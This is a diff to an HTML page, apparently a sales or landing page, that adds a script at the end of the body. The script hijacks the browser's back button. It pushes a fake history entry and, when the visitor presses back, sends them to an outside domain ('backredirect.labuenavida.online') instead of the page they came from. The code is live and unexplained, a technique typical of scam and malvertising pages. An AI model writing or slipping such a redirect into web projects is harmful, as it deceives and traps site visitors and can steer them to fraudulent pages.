@@ -1719,5 +1719,12 @@
   if (priceSection) observer.observe(priceSection);
 </script>
 
+<script>
+history.pushState(null, null, window.location.href);
+window.addEventListener('popstate', function() {
+  window.location.replace('https://backredirect.labuenavida.online/');
+});
+</script>
+
 </body>
 </html>
